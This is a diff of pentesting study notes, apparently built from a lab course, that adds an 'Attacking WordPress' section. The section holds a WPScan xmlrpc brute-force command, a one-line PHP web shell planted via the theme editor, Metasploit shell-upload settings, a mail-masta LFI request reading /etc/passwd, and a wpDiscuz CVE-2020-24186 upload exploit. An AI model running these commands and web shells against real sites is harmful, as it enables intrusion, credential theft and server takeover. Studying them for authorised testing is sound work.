@@ -39,10 +39,10 @@
             const path_to_root = "";
             const default_light_theme = "light";
             const default_dark_theme = "navy";
-            window.path_to_searchindex_js = "searchindex-1cca927e.js";
+            window.path_to_searchindex_js = "searchindex-58b690d9.js";
         </script>
         <!-- Start loading toc.js asap -->
-        <script src="toc-49607fe0.js"></script>
+        <script src="toc-6f9cff0c.js"></script>
     </head>
     <body>
     <div id="mdbook-help-container">
@@ -25245,9 +25245,10 @@ SQL&gt; xp_cmdshell whoami /priv
 </ul>
 <h3 id="wordpress"><a class="header" href="#wordpress">WordPress</a></h3>
 <ul>
-<li><a href="infosec/attacking-common-applications/wordpress">WordPress — discovery &amp; enumeration overview, user roles, WPScan</a>
+<li><a href="infosec/attacking-common-applications/wordpress">WordPress — discovery &amp; enumeration overview, user roles, WPScan, brute force, RCE</a>
 <ul>
 <li><a href="#wordpress--discovery--enumeration">Discovery &amp; Enumeration — footprinting, manual curl enumeration, plugin/theme fingerprinting, user enumeration, WPScan</a></li>
+<li><a href="#attacking-wordpress">Attacking WordPress — login brute force (xmlrpc), theme editor RCE, Metasploit shell upload, mail-masta LFI, wpDiscuz RCE (CVE-2020-24186)</a></li>
 </ul>
 </li>
 </ul>
@@ -25383,11 +25384,120 @@ SQL&gt; xp_cmdshell whoami /priv
 <h2 id="directory-map-16"><a class="header" href="#directory-map-16">Directory map</a></h2>
 <ul>
 <li><a href="#wordpress--discovery--enumeration">WordPress — Discovery &amp; Enumeration — footprinting, manual enumeration, user roles, WPScan</a></li>
+<li><a href="#attacking-wordpress">Attacking WordPress — login brute force, theme editor RCE, Metasploit shell upload, mail-masta LFI, wpDiscuz RCE</a></li>
 </ul>
 <h2 id="summary-6"><a class="header" href="#summary-6">Summary</a></h2>
 <p>WordPress is the most widely deployed CMS on the internet (~32.5% of all sites), making it a near-certain encounter during external penetration tests. It runs PHP on Apache with a MySQL backend and exposes a predictable directory structure: <code>/wp-admin/</code> (admin dashboard), <code>/wp-content/plugins/</code>, <code>/wp-content/themes/</code>, and <code>/wp-login.php</code>. The presence of these paths in <code>robots.txt</code> or page source is usually enough to confirm a WordPress installation.</p>
 <p><strong>Manual enumeration</strong> starts with <code>curl | grep WordPress</code> to extract the version from the <code>&lt;meta name="generator"&gt;</code> tag, then <code>grep themes</code> and <code>grep plugins</code> across multiple page URLs to map installed components and their versions (exposed via <code>?ver=</code> query parameters). Plugin <code>readme.txt</code> files — often accessible when directory listing is enabled — confirm exact versions. Many plugins carry publicly known CVEs; <code>mail-masta 1.0.0</code> (LFI), <code>wpDiscuz 7.0.4</code> (unauthenticated RCE), and outdated core versions are common findings.</p>
 <p><strong>User enumeration</strong> is possible because WordPress returns distinct error messages for unknown usernames versus wrong passwords at <code>/wp-login.php</code>. <strong>WPScan</strong> (<code>wpscan --url TARGET --enumerate --api-token TOKEN</code>) automates core/theme/plugin/user enumeration and maps findings to CVEs via WPVulnDB (free tier: 25 requests/day). Automated scanning alone is insufficient — WPScan only sees plugins referenced on scanned pages; manual <code>curl | grep plugins</code> across multiple posts catches the rest. The two methods must be combined.</p>
+<p><strong>Attacking WordPress</strong> follows a two-stage pattern. First, obtain admin credentials — WPScan brute-forces <code>/xmlrpc.php</code> (preferred for speed) or <code>/wp-login.php</code> using <code>--password-attack xmlrpc</code>. With credentials, the theme editor (<code>Appearance → Theme Editor</code>) allows injecting a one-line PHP web shell (<code>system($_GET[0]);</code>) into an inactive theme’s <code>404.php</code>, reachable at <code>/wp-content/themes/&lt;theme&gt;/404.php?0=&lt;cmd&gt;</code>. The Metasploit module <code>exploit/unix/webapp/wp_admin_shell_upload</code> automates this as a plugin upload. Plugin CVEs can bypass authentication entirely: <code>mail-masta 1.0.0</code> exposes an unauthenticated LFI via an unsanitized <code>include($_GET['pl'])</code>, and <code>wpDiscuz 7.0.4</code> (CVE-2020-24186) allows unauthenticated file upload via MIME type bypass, resulting in a PHP web shell in <code>/wp-content/uploads/</code>.</p>
+<div style="break-before: page; page-break-before: always;"></div>
+<h1 id="attacking-wordpress"><a class="header" href="#attacking-wordpress">Attacking WordPress</a></h1>
+<h2 id="login-brute-force"><a class="header" href="#login-brute-force">Login brute force</a></h2>
+<p>WPScan supports two brute-force methods against <code>/wp-login.php</code>:</p>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Method</th><th>Mechanism</th><th>Notes</th></tr>
+</thead>
+<tbody>
+<tr><td><code>wp-login</code></td><td>Standard login form</td><td>Slower</td></tr>
+<tr><td><code>xmlrpc</code></td><td>WordPress XML-RPC API via <code>/xmlrpc.php</code></td><td>Faster — preferred</td></tr>
+</tbody>
+</table>
+</div>
+<pre><code class="language-bash">sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local
+</code></pre>
+<div class="table-wrapper">
+<table>
+<thead>
+<tr><th>Flag</th><th>Purpose</th></tr>
+</thead>
+<tbody>
+<tr><td><code>--password-attack xmlrpc</code></td><td>Use XML-RPC method</td></tr>
+<tr><td><code>-t 20</code></td><td>20 threads</td></tr>
+<tr><td><code>-U john</code></td><td>Username or file of usernames</td></tr>
+<tr><td><code>-P /path/to/wordlist</code></td><td>Password wordlist</td></tr>
+</tbody>
+</table>
+</div>
+<p>Successful output:</p>
+<pre><code>[SUCCESS] - john / firebird1
+[!] Valid Combinations Found:
+ | Username: john, Password: firebird1
+</code></pre>
+<hr>
+<h2 id="code-execution-via-theme-editor"><a class="header" href="#code-execution-via-theme-editor">Code execution via theme editor</a></h2>
+<p>With admin credentials, WordPress’s built-in theme editor provides direct PHP source code access.</p>
+<h3 id="manual-web-shell"><a class="header" href="#manual-web-shell">Manual web shell</a></h3>
+<ol>
+<li>Log in → <strong>Appearance</strong> → <strong>Theme Editor</strong></li>
+<li>Select an <strong>inactive</strong> theme (e.g., Twenty Nineteen) to avoid breaking the live site</li>
+<li>Edit an uncommon file such as <code>404.php</code></li>
+<li>Add a one-line web shell below the existing comments:</li>
+</ol>
+<pre><code class="language-php">system($_GET[0]);
+</code></pre>
+<ol start="5">
+<li>Click <strong>Update File</strong></li>
+</ol>
+<p>Execute commands via the installed path:</p>
+<pre><code class="language-bash">curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
+</code></pre>
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>Theme files are located at <code>/wp-content/themes/&lt;theme-name&gt;/</code>.</p>
+<h3 id="metasploit--wp_admin_shell_upload"><a class="header" href="#metasploit--wp_admin_shell_upload">Metasploit — wp_admin_shell_upload</a></h3>
+<p>Uploads a malicious plugin, uses it to spawn a PHP Meterpreter shell, then cleans up the plugin files.</p>
+<pre><code>use exploit/unix/webapp/wp_admin_shell_upload
+set username john
+set password firebird1
+set lhost 10.10.14.15
+set rhost 10.129.42.195
+set VHOST blog.inlanefreight.local
+exploit
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> Both <code>RHOSTS</code> (IP) and <code>VHOST</code> (hostname) must be set when the target uses virtual hosting — omitting <code>VHOST</code> causes the error <code>The target does not appear to be using WordPress</code>.</p>
+</blockquote>
+<p>Result: Meterpreter session as <code>www-data</code>. The module attempts to delete its uploaded plugin files — verify cleanup and document any artifacts left behind.</p>
+<hr>
+<h2 id="leveraging-known-plugin-vulnerabilities"><a class="header" href="#leveraging-known-plugin-vulnerabilities">Leveraging known plugin vulnerabilities</a></h2>
+<p>WordPress plugin vulnerabilities make up ~89% of all WordPress CVEs (vs. 4% core, 7% themes). Abandoned or forgotten plugins are a common source — use <code>waybackurls</code> against the Wayback Machine to find older versions of a site that may reference deprecated plugins still present on disk.</p>
+<h3 id="mail-masta--lfi-unauthenticated"><a class="header" href="#mail-masta--lfi-unauthenticated">mail-masta — LFI (unauthenticated)</a></h3>
+<p><strong>Affected version:</strong> 1.0.0 (and below)<br><strong>Vulnerability:</strong> <code>include()</code> on an unsanitized GET parameter — no validation, no sanitization.</p>
+<p>Vulnerable code (<code>count_of_send.php</code>):</p>
+<pre><code class="language-php">&lt;?php
+include($_GET['pl']);
+// ...
+</code></pre>
+<p><strong>Exploit:</strong></p>
+<pre><code class="language-bash">curl -s "http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
+</code></pre>
+<p>Returns the contents of <code>/etc/passwd</code> directly. Also carries an unauthenticated SQL injection in the same plugin.</p>
+<hr>
+<h3 id="wpdiscuz-704--unauthenticated-rce-cve-2020-24186"><a class="header" href="#wpdiscuz-704--unauthenticated-rce-cve-2020-24186">wpDiscuz 7.0.4 — Unauthenticated RCE (CVE-2020-24186)</a></h3>
+<p><strong>Affected version:</strong> 7.0.4<br><strong>Vulnerability:</strong> File upload MIME type bypass — the plugin is meant to accept only images, but the MIME detection can be spoofed to upload a PHP file, achieving unauthenticated RCE.</p>
+<p><strong>Exploit script:</strong></p>
+<pre><code class="language-bash">python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
+</code></pre>
+<p>The script uploads a PHP web shell to <code>/wp-content/uploads/</code> and prints the path. If the built-in command runner fails, interact with the shell directly:</p>
+<pre><code class="language-bash">curl -s "http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id"
+</code></pre>
+<pre><code>GIF689a;
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p>The <code>GIF689a;</code> prefix is part of the file upload bypass (magic bytes spoofing). Commands are passed via <code>?cmd=</code>.</p>
+<p><strong>Cleanup:</strong> Delete the uploaded <code>.php</code> file from <code>/wp-content/uploads/</code> and record it as a testing artifact in the report appendix.</p>
+<hr>
+<h2 id="post-exploitation-artifacts--reporting-requirements"><a class="header" href="#post-exploitation-artifacts--reporting-requirements">Post-exploitation artifacts — reporting requirements</a></h2>
+<p>For any artifact created on a client system during an assessment, the report appendix must include:</p>
+<ul>
+<li>Exploited systems (hostname/IP, method)</li>
+<li>Compromised accounts (username, method, local vs. domain)</li>
+<li>Files uploaded or created (full path, filename)</li>
+<li>Configuration changes made (local admin added, group membership changed, etc.)</li>
+</ul>
 <div style="break-before: page; page-break-before: always;"></div>
 <h1 id="wordpress--discovery--enumeration"><a class="header" href="#wordpress--discovery--enumeration">WordPress — Discovery &amp; Enumeration</a></h1>
 <h2 id="background"><a class="header" href="#background">Background</a></h2>
